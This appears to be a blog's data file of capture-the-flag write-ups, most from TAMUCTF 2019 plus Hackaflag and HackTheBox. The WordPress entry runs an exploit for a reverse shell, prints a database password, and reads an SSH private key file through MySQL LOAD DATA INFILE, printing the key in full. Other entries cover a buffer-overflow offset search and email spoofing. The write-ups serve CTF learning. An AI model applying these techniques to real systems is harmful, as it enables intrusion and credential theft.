      "tamuctf2019-wordpress-write-up": {
        "title": "TAMUCTF2019 Wordpress Write-up",
        "author": "",
        "category": "",
        "content": "Hey guys! This post i‚Äôm my mindset on how I solved the Wordpress challenge from TAMUCTF2019This kind of challenge is very similar to those HackTheBox challenges, where you have to get RCE from a system and then escalate your privileges to root! Let‚Äôs GO.As I said before our goal is to get the flag inside ‚Äú/root/flag.txt‚Äù since it is inside the root folder we must become root to read it. (Most of the time)We‚Äôre given an openvpn config file to connect to that docker network where the machine is running.Let‚Äôs start our enumaration with nmap.nmap -sV -sC 170.30.0.3And we get the following services.~/ctf/tamu/wordpress # nmap 172.30.0.3 -sV -sC                                                                                                                    root@kaliStarting Nmap 7.70 ( https://nmap.org ) at 2019-03-02 18:05 ESTNmap scan report for 172.30.0.3Host is up (0.19s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.12 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 0d:1f:51:d6:f3:3e:07:f6:cc:0f:4f:88:12:de:e2:52 (DSA)|   2048 75:cb:36:cf:54:fa:ed:48:99:93:d2:54:a3:b0:8e:8c (RSA)|   256 f8:59:11:11:0f:74:31:39:55:40:2c:3a:f9:52:9c:45 (ECDSA)|_  256 fe:af:37:4e:b6:78:d8:4f:ec:5b:71:a6:c3:64:c1:ae (ED25519)80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))|_http-generator: WordPress 5.1|_http-server-header: Apache/2.4.7 (Ubuntu)|_http-title: TAMUctf &amp;#8211; Just another WordPress siteMAC Address: 02:42:C7:86:A7:37 (Unknown)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.34 secondsBased on the nmap result, we got an ssh and HTTP Service. Cool, probably the WordPress site, so let‚Äôs focus on this.When we open the wordpress site, nothing calls our attention to explore so Iran WPScan against it.wspcan --url http://172.30.0.3[+] revslider | Location: http://172.30.0.3/wp-content/plugins/revslider/ | | Detected By: Urls In Homepage (Passive Detection) | | [!] 2 vulnerabilities identified: | | [!] Title: WordPress Slider Revolution Local File Disclosure |     Fixed in: 4.1.5 |     References: |      - https://wpvulndb.com/vulnerabilities/7540 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579 |      - https://www.exploit-db.com/exploits/34511/ |      - https://www.exploit-db.com/exploits/36039/ |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html |      - http://packetstormsecurity.com/files/129761/ | | [!] Title: WordPress Slider Revolution Shell Upload |     Fixed in: 3.0.96 |     References: |      - https://wpvulndb.com/vulnerabilities/7954 |      - https://www.exploit-db.com/exploits/35385/ |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/ |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute | | The version could not be determined.This part cought my attention, apparently this wordpress is running ‚ÄúSlider Revolution‚Äù which seems to have a few exploits available. So I googled them a bit.I found this modulo on metasploit that leads to RCE directly, I ran it but no so confident It would work.But hey it did work and I got my reverse shell! Cool, part 1 finished.Next step is to figure out how we can escalate our privileges to root. Let‚Äôs enumerate.Without going very far I found an interesting file in /var/www called note.txt.Your ssh key was placed in /backup/id_rsa on the DB server.Hum? So the mysql database running for the wordpress, is not running in this server? Let‚Äôs find out where it is.By going through the Wordpress config files we must check wp-config.php.// ** MySQL settings - You can get this info from your web host ** ///** The name of the database for WordPress */define('DB_NAME', 'wordpress');/** MySQL database username */define('DB_USER', 'wordpress');/** MySQL database password */define('DB_PASSWORD', '0NYa6PBH52y86C');/** MySQL hostname */define('DB_HOST', '172.30.0.2');That‚Äôs interesting, we got DB_NAME, DB_USER, DB_PASSWORD and DB_HOSTAt this time the challenge is basically over. Let‚Äôs connect to the mysql server.~/ctf/tamu/wordpress # mysql -h 172.30.0.2 -u wordpress -p0NYa6PBH52y86C   root@kali Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MySQL connection id is 65Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL&gt;We got our connection, so we‚Äôre inside the 172.30.0.2 where the backup ssh key is stored at /backup/id_rsa all we have to do now is read this file with mysql.So i created a table foo inside Mysql database.MySQL [mysql]&gt; create table foo(line blob);Query OK, 0 rows affected (0.20 sec)MySQL [mysql]&gt;Then I loaded the content of the ssh key file inside the table.MySQL [mysql]&gt; LOAD DATA infile '/backup/id_rsa' INTO TABLE foo;Query OK, 27 rows affected (0.20 sec)Records: 27  Deleted: 0  Skipped: 0  Warnings: 0MySQL [mysql]&gt; select * from foo    -&gt; ;+------------------------------------------------------------------+| line                                                             |+------------------------------------------------------------------+| -----BEGIN RSA PRIVATE KEY-----                                  || MIIEpAIBAAKCAQEA3Z35DpTcnm4kFkkGp6iDXqvUNH+/+hSDOY6rXsa40WMr7rjc || tHh8TgOBFZ6Rj5VzU/jY8O0qHxiPVn7BCYKhqyp1V1l9/ZCPRSjRLYy62dVTiHUt || ZbiPiY9+biHIsQ/nZfwiHmwlb0sWDoyFvX3OL/3AFMcYpZ4ldHQuwszJF4DeTV33 || ruSBoXIiICQyNJBHTboVel+WXAfMNumYMVNrtrwpNoD7whv9Oa2afUejXMJL42Rw || 8Xhab59HIIL9fl68FqgggVI4X3d/fzqKKGyoN5JxBLmQTCiVxhxTMv9OS0MhdSg6 || Nh3+lf/wUuweUQXqmohvETntwwGs8jnJGCyeDwIDAQABAoIBAHGVRpG/n/cfMiWt || 1dhWGMaLwJ4Ln6QXoU39nj1cEltWvayDWLKyUdtWFnGzLJ1vloVCNEX+96iqWMSX || AG7UYfGtOCjFuDoePh/PFK6IwzdkC4UTsWnCFucFAWKGtCpzoUB24jG/ccxBqpNY || WC9PbD7SigDcLfisPjwaU+EJPkNpl93VBk1BCJRbvWF+Wl/si3wmMZ0YRoyIAF5L || oBsq935xH8kJcixSVYKjG3hMUZfiLoQB+p/IFsxDlfGLE+M1esTZ5GIRjj+t7vBN || l2JZTY893gjfQzUv2WrJXzMhJvWGzOCsRRc4gOSeS6GYiip8glqg8iWHpWdgF6i9 || oAQx5pkCgYEA7oTmvy0cXvhPjkEbrizCCqf6sXfZps5e6eminTTBGA8NW/Uq+SQv || 5JEYxvIL+qMH6cKkc8rBaNhgy3vnv+UgE1PUFI0UWFGKb+OpzzvY/zkmf03enxrl || SK+QXH4FS9f7leivZRVEWBq1kDVIqHZtybYGg0etOvHYX0GwqV2UTy0CgYEA7dv0 || bxz6CO9bhxxpXRrrykX2Z57J3JW2I3yVkCY+4Y6x106K11X+b1547kEZk40i2Ugc || iE6jcYIRiYNiSgb0Ph4uxZHFlvBr8JA2fGHYIAnGRcoc1Gzgz5omRvU9H8uy5ipO || LyZ2dnMgXRVOjuXoN4UZR2rgWmJVLD1q7eKnh6sCgYAnVOUUC2VNR9celx/wZdMN || nMubLi9G8Wr3WZ6GG+fnhrvmORSABvaa005pqApPp0irxHwH2BxypJO5mlIJ88eJ || SF6FkQoU0kVo0/rxgGX1GEB/56BZTj8W8FR23BUVf6UuADPEEHC3spfUEuVLWlQa || WhjS1yP6v1y1wIhYNWU6dQKBgQDbZ1zdcXkh7MgcpRR7kW2WM1rK0imZk29i5HSB || dwXhwWJCHGztnKEJ0bby7pHNDQ7sJhxLj14sQbIzikGLz0ZUVjsGeyQryrGGQUBB || E2/sfZeqoHhfad8lICfWpDgxsA/hR3y++VekgyWDNzgzj9bX/6oFuowgUzwFhtGv || hLbL6QKBgQCvcDMmWs2zXwmIo1+pIHUUSv2z3MWb0o1dzHQI/+FJEtyQPwL1nCwg || bJaC0KT45kw0IGVB2jhWf0KcMF37bpMpYJzdsktSAmHdjLKdcr6vw2MNpRapaNQe || On0QmLzbpFr9kjqorinKVkjk/WlTo9rKDSrLiUueEVYTxEMCi92giw==         || -----END RSA PRIVATE KEY-----                                    |+------------------------------------------------------------------+27 rows in set (0.20 sec)I copied this private to my local computer and used to log via ssh.And we got Root!gigem{w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE}Hope you guys enjoyed it!by me",

      "tamuctf2019-pwn3-write-up": {
        "title": "TAMUCTF2019 PWN3 Write-up",
        "author": "",
        "category": "",
        "content": "Hey Guys! This post i‚Äôll be showing you how I managed to solve PWN3 challenge from TAMUCTF2019!This was a standard stack execution where we had to insert our shellcode in the stack and point ou EIP there to execute it. Let‚ÄôGO!Let‚Äôs execute the binary locally to see what happens.After sending a lot of bytes we get a ‚Äúseg fault‚Äù and that‚Äôs what we want. Using GDB let‚Äôs find out how many bytes we must send to control EIP.gdb-peda$ pattern_create 400'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y'Legend: code, data, rodata, valueStopped reason: SIGSEGV0x25416825 in ?? ()gdb-peda$ pattern_searchRegisters contain pattern buffer:EBX+0 found at offset: 294EBP+0 found at offset: 298EIP+0 found at offset: 302Registers point to pattern buffer:[EAX] --&gt; offset 0 - size ~203[ESP] --&gt; offset 306 - size ~94Using pattern_search we discover that offset is 302 bytes long. Cool valuable information there, but where is our ESP? Since that value keeps changing when we connect via netcat ASLR is on, so it gets hard to know where to point to. So we need to discover what is the address that pops up when the program is executed.Running a few times in different environments I noticed that we can use this address to determine the exact position of our ESP, because that address + 0x132 = $ESPStarting program: /root/ctf/tamu/pwn3/pwn3 Take this, you might need it on your journey 0xffffd01e!gdb-peda$ x/5wx $esp0xffffd150: 0x4d254137 0x41692541 0x25413825 0x6a25414eSo, by doing 0xffffd150 - 0xffffd01e = 0x132Cool! Now we have everything set, let‚Äôs create our exploit.Got my shellcode from shellstorm.comHope you guys enjoyed it!by me",
        "url": "/tamuctf2019-pwn3-write-up/"
      }
      ,

        "content": "Hey guys, This is how I solved the Onboading Checklist Challenge from TamuCTF 2019.This kind of challenge you don‚Äôt see everyday so it was a lot of fun and really simple.Let‚Äôs GO!The Challenge presents itself with this message. Apparently ‚Äúimportantperson‚Äù has allowed ‚Äúsomeguy‚Äù to ask for new account request for the new employees and asked ‚Äúsomeguy‚Äù to send an e-mail to tamuctf@gmail.com with the new employee‚Äôs e-mail address.So, all we have to do is send a spoofed email to tamuctf@gmail pretending to ‚Äúsomeguy‚Äù with our e-mail address.I used this Website to do it.And a few hours later we get our response back.Hope you guys enjoyed it!by me",

      "tamuctf2019-keygenme-write-up": {
        "title": "TAMUCTF2019 Keygenme ‚Äî Write-up",
        "author": "",
        "category": "",
        "content": "Hello everybody! This is how I solved one of the many reversing problems at TAMUCTF 2019.This one was Keygenme, a pretty standard kind of challenge but yet very fun to solve it.Let‚Äôs go!Let‚Äôs start by running the binary that was given to us and see what it says.Basically, when we run the binary it asks for a product key and if we give an incorrect one it simply shuts itself down. Then I searched for the strings inside the binary, sometimes they help us understand what the program is doing.By using rabin2 I was able to identify all the strings in the binary, all of them are very important so let‚Äôs take a look at them one by one\t[OIonU2_&lt;__nK&lt;KsKA pretty odd string that at the start don‚Äôt get our attention as the others, but it‚Äôs gonna be important in a moment.\\nPlease Enter a product key to continue:That‚Äôs the string we just saw.flag.txtA string that everybody likes to see, but I don‚Äôt have a flag.txt? Do you?Too bad the flag is only on the remote server!String, even if we bypassed the checking functions using the disassembler locally we would not be able to retrieve our flag because it‚Äôs been hosted remotely.So with this quick overview of the strings, we now know that we have to create our own keygen to beat this challenge.Analyzing the binary with hopper disassembler there are 3 functions that get our attention0x92a P enc0x9da P verify_key0xa46 P mainIt‚Äôs pretty clear what each function is doing so I‚Äôm gonna skip that whole explanation and focus on the verify_key function first.That part is at the beginning of the function verify_key and its job is to get our input, our ‚ÄúKEY‚Äù, and checks if its size is bigger than 0x9 in hexa aka 9 in decimal xd.So, important information, we must supply a key that is longer than 9 digits, noted.Right after this block, there‚Äôs a check to see if our input is larger than 0x40 bytes, since we will no be providing a key this long, I‚Äôm gonna skip it.There are a few import things we must consider on this part of the function.\tThe enc function is called by verify_key and not by main.\tRight after enc function is called our modified key is compared to [OIonU2_&lt;__nK&lt;KsK\tNow it‚Äôs clear that we have to provide some input that after it passes the enc function it has to be equal to that strange string we saw early on.Now we have to go through the enc function and figure what it is doing with our input and reverse it.0000000000000960         mov        eax, dword [rbp+var_10]    ; CODE XREF=enc+1680000000000000963         movsxd     rdx, eax0000000000000966         mov        rax, qword [rbp+var_28]000000000000096a         add        rax, rdx000000000000096d         movzx      eax, byte [rax]0000000000000970         movsx      eax, al0000000000000973         lea        edx, dword [rax+0xc]0000000000000976         movzx      eax, byte [rbp+var_11]000000000000097a         imul       eax, edx000000000000097d         lea        ecx, dword [rax+0x11]0000000000000980         mov        edx, 0xea0ea0eb0000000000000985         mov        eax, ecx0000000000000987         imul       edx0000000000000989         lea        eax, dword [rdx+rcx]000000000000098c         sar        eax, 0x6000000000000098f         mov        edx, eax0000000000000991         mov        eax, ecx0000000000000993         sar        eax, 0x1f0000000000000996         sub        edx, eax0000000000000998         mov        eax, edx000000000000099a         imul       eax, eax, 0x46000000000000099d         sub        ecx, eax000000000000099f         mov        eax, ecx00000000000009a1         lea        ecx, dword [rax+0x30]00000000000009a4         mov        eax, dword [rbp+var_10]00000000000009a7         movsxd     rdx, eax00000000000009aa         mov        rax, qword [rbp+var_8]00000000000009ae         add        rax, rdx00000000000009b1         mov        edx, ecx00000000000009b3         mov        byte [rax], dl00000000000009b5         mov        eax, dword [rbp+var_10]00000000000009b8         movsxd     rdx, eax00000000000009bb         mov        rax, qword [rbp+var_8]00000000000009bf         add        rax, rdx00000000000009c2         movzx      eax, byte [rax]00000000000009c5         mov        byte [rbp+var_11], al00000000000009c8         add        dword [rbp+var_10], 0x1loc_9cc:00000000000009cc         mov        eax, dword [rbp+var_10]         ; CODE XREF=enc+5200000000000009cf         cmp        eax, dword [rbp+var_C]00000000000009d2         jl         loc_960using this part and the hopper pseudo code:int enc(int arg0) {    var_28 = arg0;    var_8 = malloc(0x40);    var_C = strlen(var_28);    var_11 = 0x48;    for (var_10 = 0x0; var_10 &lt; var_C; var_10 = var_10 + 0x1) {            rcx = (var_11 &amp; 0xff) * (sign_extend_64(*(int8_t *)(var_28 + sign_extend_64(var_10)) &amp; 0xff) + 0xc) + 0x11;            *(int8_t *)(var_8 + sign_extend_64(var_10)) = (rcx - ((SAR(HIDWORD(rcx * 0xffffffffea0ea0eb) + rcx, 0x6)) - (SAR(rcx, 0x1f))) * 0x46) + 0x30;            var_11 = *(int8_t *)(var_8 + sign_extend_64(var_10)) &amp; 0xff;    }    rax = var_8;    return rax;}I managed to write this whole process in python and I noticed that the next key‚Äôs value always depends on its previous neighbor. So to discover what key generates this [OIonU2_&lt;__nK&lt;KsK, I simply brute forced it XD.#!/usr/bin/env python enckeyFINAL = \"[OIonU2_&lt;__nK&lt;KsK\" #G&gt;base = 0x48flagfinal = \"\"flag2 = \"\"cont = 0chars= \"'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&amp;'()*+,-./0123456789:;&lt;=&gt;?@[]^_`{|}~'\"while True:\ttry:\t\t\t\tfor i in range(len(chars)):\t\t\trcx = (base*(int(ord(chars[i])) + 0xc)) + 0x11\t\t\trax = hex(rcx*0xffffffffea0ea0eb)\t\t\trax = rax[-17:]\t\t\trax = rax[:-9]\t\t\trax = int(rax,16)\t\t\trax += rcx\t\t\trax = int(hex(rax)[-5:],16)\t\t\trax = rax &gt;&gt; 0x6\t\t\tecx = rcx &gt;&gt; 0x1f\t\t\trax *= 0x46\t\t\trax = rcx - rax\t\t\trax += 0x30\t\t\tflag2 = str(chr(rax))\t\t\tif flag2 == enckeyFINAL[cont]:\t\t\t\tflagfinal = flagfinal + chars[i]\t\t\t\tcont = cont + 1\t\t\t\tbase = rax\t\t\t\tif cont == 16:\t\t\t\t\tbreak\texcept:    \t\t\tbreakprint flagfinal\t\t \t\tLINK BASE GITHUBBy running this script I gotGHZxSZcfov09&lt;GNRBLet‚Äôs send to the server and get our FLAG!Well‚Ä¶Maybe not üò¢.Let‚Äôs use gdb-PEDA to find out why we did not get our deserved flag.I set up a breakpoint right before my input and that awful string are compared and I got this.So the program adds this ‚Äú\\n‚Äù and I‚Äôm not sure why.That thing made me wonder for a while why that‚Äôs there and how to bypass it.Then I found the solution to be very simple (and a bit of luck maybe?). This ‚Äú\\n‚Äù is changing into ‚Äúi‚Äù because it‚Äôs after a ‚ÄúB‚Äù, so I have to find a character that change ‚Äú\\n‚Äù into ‚ÄúK‚Äù.And the ‚ÄúR‚Äù was there all along to save me.Hope you guys enjoyed it!by me",
        "url": "/tamuctf2019-keygenme-write-up/"
      }

        "content": "Hey guys! This post I‚Äôll be showing you how I solved the Hello World Challenge from TAMUCTF2019.This was a MISC challenge rated as medium difficulty by the CTF organizers.I downloaded the file and used the cat command on it.It showed something like that. That made me think, what are those blank spaces?00000000: 2020 2009 0920 2009 0909 0a20 2020 0909     ..  ....   ..                                                                                                                                                                    00000010: 2009 2020 090a 2020 2009 0920 2009 0909   .  ..   ..  ...                                                                                                                                                                    00000020: 0a20 2020 0909 2020 0920 090a 2020 2009  .   ..  . ..   .                                                                                                                                                                    00000030: 0920 0909 2009 0a20 2020 0909 0909 2009  . .. ..   .... .                                                                                                                                                                       00000040: 090a 2020 2009 0920 2020 200a 2020 2009  ..   ..    .   .                                                                                                                                                                        00000050: 0920 0920 2020 0a20 2020 0920 0909 0909  . .   .   . .... 00000060: 090a 2020 2009 0920 0909 2009 0a20 2020  ..   .. .. ..    00000070: 0909 0909 2020 090a 2020 2009 2009 0909  ....  ..   . ... 00000080: 0909 0a20 2020 0909 0920 0909 090a 2020  ...   ... ....   00000090: 2009 0920 0920 2020 0a20 2020 0909 2009   .. .   .   .. . 000000a0: 2020 0a20 2020 0909 0920 0920 200a 2020    .   ... .  .   000000b0: 2009 2009 0909 0909 0a20 2020 0909 0920   . ......   ...  000000c0: 2009 090a 2020 2009 0909 20 2020 090a 2020 090a 2020  ..  ..  ..  ..   00000480: 090a 2020 090a 2020 090a 2020 090a 2020  ..  ..  ..  ..   00000490: 090a 2020 090a 2020 090a 2020 0a0a 0a23  ..  ..  ..  ...# 000004a0: 696e 636c 7564 6520 3c69 6f73 7472 6561  include &lt;iostrea 000004b0: 6d3e 0a75 7369 6e67 206e 616d 6573 7061  m&gt;.using namespa 000004c0: 6365 2073 7464 3b0a 0a69 6e74 206d 6169  ce std;..int mai 000004d0: 6e28 290a 7b0a 0963 6f75 7420 3c3c 2022  n().{..cout &lt;&lt; \" 000004e0: 4865 6c6c 6f2c 2057 6f72 6c64 7321 5c6e  Hello, Worlds!\\n 000004f0: 223b 0a09 7265 7475 726e 2030 3b0a 7d0a  \";..return 0;.}.Using the xxd command and the hexadecimal of this file was shown.Those strange ‚Äò20‚Äô and ‚Äò09‚Äô and ‚Äò0a‚Äô gotta mean something. After analyzing for a couple of minutes I noticed that the ‚Äò0a‚Äô repeats itself always after 10 spaces.So I imagined this should be a binary encoded string where ‚Äò20‚Äô = 0 , ‚Äò09‚Äô = 1 and ‚Äò0a‚Äô = space. So I wrote a small python script to extract the flag!#!/usr/bin/env pythonflagenc = open(\"flagenc.txt\", \"rwa\")support=\"\"support2 = \"\"for line in flagenc.readlines():\tline = line[10:-17]\tline = line.replace(\"20\", \"0\")\tline = line.replace(\"09\", \"1\")\tline = line.replace(\" \", \"\")\tline = line.replace(\"0a\", \" \")\tsupport = support + line\tsupport = support.split(\" \")for i in range(0,136):\tflagenc2 = int(support[i],2)\tif flagenc2 == 1:\t\tbreak\tflagenc3 = str(chr(flagenc2))\tsupport2 = support2 + flagenc3print \"[+]FLAG:\"+ support2LINK BASE GITHUBHope you guys enjoyed it!by me",

        "content": "Fala galera! at√© o dia 17/04 rolou a 1¬™ etapa do Hackaflag 2019.Consegui a 4¬™ coloca√ß√£o nesse etapa e os desafios foram bem legais.Resolvi trazer esses dois porque foram os que achei mais divertidos de resolver.PS: Esses foram os m√©todos que usei para resolver, talvez n√£o os melhores, mas com certeza cheguei nas flags xd1 Desafio -&gt; MISCDescri√ß√£o: Por mais pequeno que seja, esse desafio vem com a miss√£o de fazer voc√™ conhecer um formato de arquivo EPS e entender como ele √© composto.Al√©m dessa breve descri√ß√£o nos √© dado um arquivo para download. Vamos analis√°-lo.[~/ctf/hackaflag/misc]$ file flag                                            flag: DOS EPS Binary File Postscript starts at byte 30 length 68473 TIFF starts at byte 68503 length 2317330Bem como disse a descri√ß√£o, temos um arquivo EPS, mas ainda n√£o conseguimos abri-lo porque no pr√≥prio retorno do comando file ele nos diz que o EPS come√ßa no byte 30.Precisamos remover esses 30 primeiros bytes. Vamos usar o comando ‚Äòdd‚Äô para isso.dd if=flag of=flag.eps ibs=30 skip=1Agora quando rodamos o comando ‚Äòfile‚Äô novamente j√° nos √© retornado outra coisa[~/ctf/hackaflag/misc/writeup]$ file flag.eps                                               flag.eps: PostScript document text conforming DSC level 3.0, type EPS, Level 2Vamos tentar abr√≠-lo com o programa InkscapeErro, pois ainda no arquivo h√° um tiff como vimos la no primeiro ‚Äòfile‚Äô que demos.Para retir√°-lo, vamos usar o comando ‚Äòtruncate‚Äô[~/ctf/hackaflag/misc/writeup]$ truncate -s 68395 flag.epsAgora ao abr√≠-lo com o Inkscape, temosEssa imagem.Essa parte √© sem d√∫vida a pior do desafio, achar onde diabos est√° a flag aqui.Passei horas, cheguei a pensar que a flag n√£o estivesse na imagem de tanto procurar, mas ela est√° ai. Uma parte da defini√ß√£o de uma EPS file diz isso:It is more like a postscript program that instructs images and drawings to be placed on a documentEnt√£o pesquisei em formas de manipular essas imagens presentes e uma delas me ajudou, o XML Editor.At√© queTa a√≠ a coisa.Pegando todos os chars temos:HACKAFLAG{ESCOND_DO_NO_L_MBO}O que n√£o √© a flag final, mas √© f√°cil ver que a flag fica‚Ä¶HACKAFLAG{ESCONDIDO_NO_LIMBO}2 desafio -&gt; REVERSEDesafio mais complicado dessa primeira etapa, foi o que teve menos solves. Por assumir coisas erradas demorei muito mais tempo do que precisava para resolver esse desafio, mas no fim deu tudo certo.Descri√ß√£o: Consegue me ajudar?Al√©m da descri√ß√£o nos √© dado um bin√°rio, campinas.exe. Um bin√°rio windows, vamos execut√°-lo.De cara j√° temos nossa flag em b64 somente - , sqn xdJoguei o bin√°rio no Ghidra para ver do que se tratava.Analisando as fun√ß√µes vemos uma bem interessante, Criptografar.Mas est√° muito complicado de analis√°-la assim, fui atr√°s de ver as strings para ver se encontrava alguma luz.Analisando notei essa que dizia ‚Äú.NET framework 4.6.1‚Äù e eu sei que consigo usar decompiler nesses sistemas, no caso usei o dotPeek da JetBrains e consegui o c√≥digo descompilado da fun√ß√£o Criptografar.Analisando passo a passo do c√≥digo\tPrimeiro √© feito uma requisi√ß√£o para essa string em hexa mas em uma formata√ß√£o estranha, depois √© passado outros par√¢metros como m√©todo, ContentType, etc, quem n√£o nos interessa.\tDepois ele pega o conte√∫do recebido do servidor e joga no MD5cryptoServiceProvider, ou seja, gera um md5 do retorno.\tAp√≥s isso, √© criado um TripleDESCryptoServiceProvider que tem como um dos par√¢metros a chave, que √© a hash md5 que foi gerado a pouco.\tAo final retorna a flag em base64 como vimos ao rodar o programa.Nossa primeira e mais dif√≠cil tarefa ser√° descobrir o endere√ßo dessa requisi√ß√£o para conseguir nossa chave.Vemos que a string encodada passada est√° em servindo de par√¢metro para outra fun√ß√£o, vamos analis√°-la, a class8_metho0, no meu caso.No caso a class8_method0 s√≥ faz uma checagem de data e retorna a string para a class9_method0Fiz uma pequena altera√ß√£o no c√≥digo e rodei a fun√ß√£o passando a string e o inteiro que vi na fun√ß√£o Criptografa.E me √© retornado isso:xdd`c*??xqs{qv|qw&gt;s}&gt;rb?sdv?tucqvyc?!qt(vt‚Äùtvrr qts !%t‚Äôr#%q$‚Äùrr)r()?s}}q~ts~db|&gt;`x`wtf is isso?Notei que eu estava esperando uma url e resolvi comparar, notemos que podemos fazer ascii(x) ‚Äî 16 -&gt; h ascii(d) +16 -&gt; t ascii(`)-&gt; p ascii(c) + 16-&gt; s da√≠ ja conseguimos o ‚Äòhttps‚ÄôEu realmente espero do fundo do cora√ß√£o que haja um m√©todo melhor de resolver do que esse T.TAo terminarmos de decodar:https://hackaflag.com.br/ctf/desafios/1ad8fd2dfbb0adc015d7b35a42bb9b89/commandcontrol.phpAcessando esse link encontramos nossa chave.THMPV-77D6F-94376‚Äì8HGKG-VRDRQDepois disso devemos lembrar que a chave foi encodada em b64 para fazer criptografar nossa flag.Ent√£o,\tCriptografia TripleDES\tModo ECB\tchave = d5637a2c7e17f17947df72f5b3d3d20c\tflag = YMP1zrjTmr1P0wVJh7ocL55O5ZY3EYecJ√° temos tudo!Usei essa √≥tima ferramenta online para conseguir a flag.CLICK TO ACCESS 3DES EncryptionTive que passar a flag para hex, pois a tool n√£o suportava b64.HACKAFLAG{TripleDESneT}Assim foi como resolvi essas duas flags dessa etapa, espero que algu√©m tenha aprendido algo, se n√£o escrevi isso tudo pra nada xdObrigado!By me",

        "content": "Hey guys! In this post I will be showing how I solved the machine ‚ÄúFrolic‚Äù from HackTheBox.It was a pretty ctf like machine, and well‚Ä¶ I love ctfs, so that turned out to be really fun, specially priv esc part.I‚Äôll be posting the links where I got some references on how to proceed when I got a bit stucked.Let‚Äôs start with our standard nmap scan:nmap -sV -sC -v 10.10.10.111# Nmap 7.60 scan initiated Sat Mar 16 08:43:07 2019 as: nmap -sV -sC -v -o frolic 10.10.10.111Nmap scan report for 10.10.10.111Host is up (0.23s latency).Not shown: 996 closed portsPORT     STATE SERVICE     VERSION22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (EdDSA)139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)9999/tcp open  http        nginx 1.10.3 (Ubuntu)| http-methods: |_  Supported Methods: GET HEAD|_http-server-header: nginx/1.10.3 (Ubuntu)|_http-title: Welcome to nginx!Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| nbstat: NetBIOS name: FROLIC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)| Names:|   FROLIC&lt;00&gt;           Flags: &lt;unique&gt;&lt;active&gt;|   FROLIC&lt;03&gt;           Flags: &lt;unique&gt;&lt;active&gt;|   FROLIC&lt;20&gt;           Flags: &lt;unique&gt;&lt;active&gt;|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;| smb-os-discovery: |   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)|   Computer name: frolic|   NetBIOS computer name: FROLIC\\x00|   Domain name: \\x00|   FQDN: frolic|_  System time: 2019-03-16T17:13:43+05:30| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2019-03-16 08:43:43|_  start_date: 1600-12-31 21:26:00Read data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Mar 16 08:43:49 2019 -- 1 IP address (1 host up) scanned in 42.33 secondsWe can spot four different services running on this box, three of them are useless for us, so let‚Äôs focus on the service running on port 9999, a web service.We are presented with the default nginx page, brute forcing some directories we find the /admin page.A log in page, we must find some credentials. Looking in the source code of the js file, we find this.Great, we got our user and pass. Let‚Äôs check the success.html page.user = adminpassword = superduperlooperpassword_lolWhat the heck is this?? üòêAfter some searching on esoteric languages I found this ‚ÄúOok!?‚Äù Programming language and a website that could decode it.It tells us to check another directory so off we go.Reaching this dir we find thisUEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj 